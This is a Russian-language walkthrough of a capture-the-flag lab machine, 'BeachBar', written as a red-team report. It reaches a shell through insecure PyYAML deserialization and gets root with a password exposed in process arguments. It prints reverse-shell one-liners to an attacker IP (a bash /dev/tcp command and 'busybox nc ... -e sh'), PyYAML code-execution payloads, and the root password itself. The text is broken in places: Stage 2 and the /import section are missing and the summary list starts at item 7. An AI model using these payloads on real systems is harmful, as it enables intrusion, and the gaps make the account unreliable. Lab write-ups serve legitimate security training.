# BeachBar — Red Team Walkthrough Report

## Объект исследования

**Target:** BeachBar

**Цель:** Получение первоначального доступа к системе и последующая эскалация привилегий до уровня root.


# Этап 1. Разведка

Первоначально было выполнено сканирование целевой машины при помощи Nmap.

**Обнаруженные сервисы:**

* TCP/22 — SSH
* TCP/80 — Gunicorn Web Server

Дальнейшее исследование было сосредоточено на веб-приложении, опубликованном на 80 порту.

Главная страница содержала форму аутентификации.

был получен доступ к пользовательской панели.


# Этап 3. Анализ внутреннего функционала

После успешной авторизации были исследованы внутренние разделы приложения.

## /dashboard

Интересных функций, пригодных для дальнейшей эксплуатации, обнаружено не было.

## /import

# Этап 4. Проверка возможности загрузки исполняемого кода

Первоначально была предпринята попытка загрузить PHP reverse shell.

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.130.144/4444 0>&1'"); ?>
```

Попытка не принесла результата.

Аналогично был протестирован Python reverse shell.

В обоих случаях приложение не выполняло загруженный код, а лишь отображало его как обычный текст в preview.

Это позволило сделать вывод, что сервер интерпретирует содержимое как YAML-документ, а не как исполняемый скрипт.


# Этап 5. Исследование механизма десериализации

Первоначально была исследована возможность эксплуатации Ruby Insecure Deserialization.

Был подготовлен payload, основанный на Marshal.

При загрузке получена ошибка:

```
Could not load playlist: expected '<document start>', but found '<scalar>'
  in "<unicode string>", line 12, column 1:
    obj = FSResource.new('|id')
    ^
```

Ошибка показала, что приложение ожидает корректный YAML-документ и не интерпретирует Ruby-код.

После этого направление исследования было изменено в сторону PyYAML.


# Этап 6. Исследование PyYAML

Первым тестом стал стандартный payload:

```yaml
!!python/object/apply:os.system
- id
```

В результате preview вернул:

```
0
```

Код возврата `0` свидетельствовал об успешном выполнении команды `id`, что подтвердило наличие небезопасной десериализации PyYAML.

Далее был исследован публичный PoC, опубликованный для CVE-2026-24009.

Использовался следующий payload:

```yaml
!!python/object/new:type
args:
  - "x"
  - !!python/tuple []
  - extend: !!python/name:exec
listitems: __import__('os').system('uname -a; id')
```

Результатом выполнения стало:

```
<class 'yaml.constructor.x'>
```

Несмотря на успешную обработку Python-тегов, данный вариант payload не обеспечивал выполнение требуемого кода.

После дальнейшего анализа было установлено, что эксплуатация возможна посредством стандартного payload PyYAML.


# Этап 7. Получение первоначального доступа

Использован следующий payload:

```yaml
!!python/object/apply:os.system ["busybox nc 192.168.130.144 4444 -e sh"]
```

После обработки YAML был получен reverse shell.

Проверка пользователя:

```
id
```

Вернула:

```
uid=1001(bartender) gid=1001(bartender)
```

После получения интерактивной оболочки был прочитан пользовательский флаг.


# Этап 8. Эскалация привилегий

## Анализ исходного кода

Дополнительно был исследован исходный код веб-приложения.

Уязвимостей, пригодных для повышения привилегий, найдено не было.


## Анализ процессов

При анализе списка процессов был обнаружен следующий процесс:

```text
root         610  0.0  0.2  20176 11700 ?        Ss   09:15   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

В аргументах процесса пароль передавался непосредственно в командной строке.

Использование обнаруженного пароля позволило завершить эскалацию привилегий до пользователя root.

После повышения привилегий был успешно прочитан root flag.

7. Получен reverse shell от имени пользователя `bartender`.
8. Выполнено исследование системы на предмет локальной эскалации привилегий.
9. Обнаружен пароль, передаваемый процессу `jukeboxd.py` в аргументах командной строки.
10. Получены привилегии пользователя root.
11. Успешно прочитан root flag.
